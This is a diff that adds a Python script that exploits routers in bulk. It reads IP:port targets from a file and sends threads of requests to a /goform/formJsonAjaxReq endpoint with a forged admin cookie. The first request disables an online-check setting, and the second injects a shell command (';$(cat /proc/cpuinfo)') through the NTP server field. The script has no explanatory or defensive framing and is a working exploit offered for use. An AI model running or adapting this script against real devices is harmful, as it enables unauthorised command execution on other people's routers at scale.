@@ -1,0 +1,74 @@
+import requests
+from concurrent.futures import ThreadPoolExecutor
+
+def process_host(ip_port):
+    url = f"http://{ip_port}/goform/formJsonAjaxReq"
+
+    headers = {
+        "Host": ip_port,
+        "Content-Length": "136",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+        "Content-Type": "application/json",
+        "Referer": f"http://{ip_port}/home.asp",
+        "Cookie": "userLanguage=EN; username=admin",
+        "Connection": "close"
+    }
+
+    try:
+        # Send the initial request
+        response = requests.post(url, json=initial_payload, headers=headers)
+        response.raise_for_status()  # Raise an HTTPError for bad responses
+
+        # Check if the response body contains {"status":1}
+        if '{"status":1}' in response.text:
+            print(f"Initial request to {ip_port} was successful.")
+
+            # Send the additional request only if the initial request was successful
+            response = requests.post(url, json=additional_payload, headers=headers)
+            response.raise_for_status()  # Raise an HTTPError for bad responses
+
+            # Check if the response body contains {"status":1}
+            if '{"status":1}' in response.text:
+                print(f"Additional request to {ip_port} was successful.")
+            else:
+                print(f"Additional request to {ip_port} was not successful. Check response for details.")
+
+    except requests.exceptions.RequestException as e:
+        # If you want to print the IP and the specific error, uncomment the line below
+        # print(f"Error for {ip_port}: {e}")
+        pass
+
+# Read IP:PORT from ips.txt
+with open("ips.txt", "r") as file:
+    ip_port_list = file.readlines()
+
+# Remove newline characters from each line
+ip_port_list = [ip.strip() for ip in ip_port_list]
+
+# Different payload structure
+initial_payload = {
+    "action": "set_online",
+    "options": {
+        "enable": 0,
+        "check_ips": ["8.8.8.8", "8.8.4.4"],
+        "interval": 10,
+        "reboot_interval": 30,
+        "agree": 1
+    }
+}
+
+additional_payload = {
+    "action": "set_timesetting",
+    "data": {
+        "ntpserver0": ";$(cat /proc/cpuinfo)",
+        "ntpserver1": "time.ntp.org",
+        "timezone": "UTC-8"
+    }
+}
+
+# Define the maximum number of threads (adjust as needed)
+max_threads = 10
+
+# Use ThreadPoolExecutor for concurrent execution
+with ThreadPoolExecutor(max_threads) as executor:
+    executor.map(process_host, ip_port_list)
